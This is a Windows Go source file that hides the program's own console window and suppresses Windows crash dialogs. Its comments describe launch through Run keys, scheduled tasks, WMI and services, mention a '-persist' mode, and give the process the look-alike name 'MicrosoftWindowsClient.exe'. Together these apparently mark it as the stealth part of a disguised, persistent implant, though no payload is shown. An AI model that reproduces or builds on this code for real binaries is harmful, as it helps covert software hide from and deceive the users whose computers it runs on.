//go:build windows

package main

import (
	"syscall"
)

var (
	modKernel32Hide  = syscall.NewLazyDLL("kernel32.dll")
	modUser32Hide    = syscall.NewLazyDLL("user32.dll")
	procGetConsole   = modKernel32Hide.NewProc("GetConsoleWindow")
	procShowWnd      = modUser32Hide.NewProc("ShowWindow")
	procSetErrorMode = modKernel32Hide.NewProc("SetErrorMode")
)

// hideOwnConsole makes our own console window vanish. Belt and suspenders
// on top of every hidden spawn: however this binary gets launched (Run key,
// task, WMI, service child, double-click), no console ever stays visible.
// Called in main for every non-interactive mode.
func hideOwnConsole() {
	if hwnd, _, _ := procGetConsole.Call(); hwnd != 0 {
		procShowWnd.Call(hwnd, 0) // SW_HIDE
	}
	suppressCrashDialogs()
}

// suppressCrashDialogs stops Windows Error Reporting fault dialogs: a
// panicking background process must die silently, never pop a
// "MicrosoftWindowsClient.exe has stopped working" box on the user's PC.
// SEM_FAILCRITICALERRORS (1) | SEM_NOGPFAULTERRORBOX (2).
func suppressCrashDialogs() {
	procSetErrorMode.Call(3)
}

var procAttachConsole = modKernel32Hide.NewProc("AttachConsole")
var procAllocConsole = modKernel32Hide.NewProc("AllocConsole")

// ensureInteractiveConsole gives -test/-help/-persist runs somewhere to
// print: attach to the parent terminal when there is one, else allocate a
// fresh console. Needed because release builds are windowsgui-subsystem
// (zero console ever) — without this, diagnostics would print into the void.
func ensureInteractiveConsole() {
	if r, _, _ := procAttachConsole.Call(^uintptr(0)); r != 0 {
		return
	}
	procAllocConsole.Call()
}
